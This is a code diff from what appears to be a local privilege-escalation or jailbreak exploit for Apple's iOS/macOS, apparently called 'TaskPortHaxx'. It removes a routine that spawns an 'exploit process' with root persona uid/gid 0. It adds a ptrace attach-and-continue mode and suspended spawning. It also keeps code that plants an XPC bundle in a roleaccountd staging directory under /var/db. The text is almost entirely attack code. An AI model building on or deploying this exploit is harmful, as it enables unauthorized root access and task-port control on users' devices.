@@ -30,7 +30,7 @@ int child_execve(char *path) {
         return 1;
     }
     
-    if(posix_spawnattr_setflags(&attr, POSIX_SPAWN_SETEXEC) != 0) {
+    if(posix_spawnattr_setflags(&attr, POSIX_SPAWN_SETEXEC | POSIX_SPAWN_START_SUSPENDED) != 0) {
         perror("posix_spawnattr_set_flags");
         return 1;
     }
@@ -45,29 +45,19 @@ int child_execve(char *path) {
     return 1;
 }
 
-pid_t spawn_exploit_process(mach_port_t exception_port) {
-    pid_t pid;
-    posix_spawnattr_t attr;
-    posix_spawnattr_init(&attr);
-    posix_spawnattr_set_persona_np(&attr, /*persona_id=*/99, POSIX_SPAWN_PERSONA_FLAGS_OVERRIDE);
-    posix_spawnattr_set_persona_uid_np(&attr, 0);
-    posix_spawnattr_set_persona_gid_np(&attr, 0);
-    //posix_spawnattr_set_ptrauth_task_port_np(&attr, mach_task_self());
-    char *argv[] = {**_NSGetArgv(), "child", NULL};
-    int ret = posix_spawn(&pid, argv[0], NULL, &attr, argv, environ);
-    if (ret) {
-        perror("posix_spawn");
-        return 0;
-    }
-    printf("Spawned exploit process with PID %d\n", pid);
-    return pid;
-}
-
 int main(int argc, char * argv[]) {
     if(argc >= 2) {
-        if (strcmp(argv[1], "child") == 0) {
-            return child_execve("/usr/libexec/xpcproxy");
+        if (argc > 2 && strcmp(argv[1], "attach") == 0) {
+            pid_t launched_pid = atoi(argv[2]);
+            int i = ptrace(14, launched_pid, 0, 0);
+            printf("ptrace attach returned %d\n", i);
+            if (i != 0) {
+                return 1;
+            }
+            ptrace(7, launched_pid, (void*)1, 0);
+            CFRunLoopRun();
         } else if (strcmp(argv[1], "dtsecurity") == 0) {
+            sleep(1); // FIXME: how to sleep until ptrace attach?
             NSString *execDir = @"/var/db/com.apple.xpc.roleaccountd.staging/exec";
             [NSFileManager.defaultManager createDirectoryAtPath:execDir withIntermediateDirectories:YES attributes:nil error:nil];
             NSString *outDir = @"/var/db/com.apple.xpc.roleaccountd.staging/exec/TaskPortHaxx.xpc";
@@ -85,12 +75,6 @@ int main(int argc, char * argv[]) {
 //            pid_t target_pid = (pid_t)atoi(argv[2]);
 //            kill(target_pid, SIGTRAP);
 //            return 0;
-        } else if (strcmp(argv[1], "test") == 0) {
-            mach_port_t exc = setup_exception_server();
-            spawn_exploit_process(exc);
-            CFRunLoopRun();
-        } else if (strcmp(argv[1], "sleep") == 0) {
-            CFRunLoopRun();
         }
     }
     
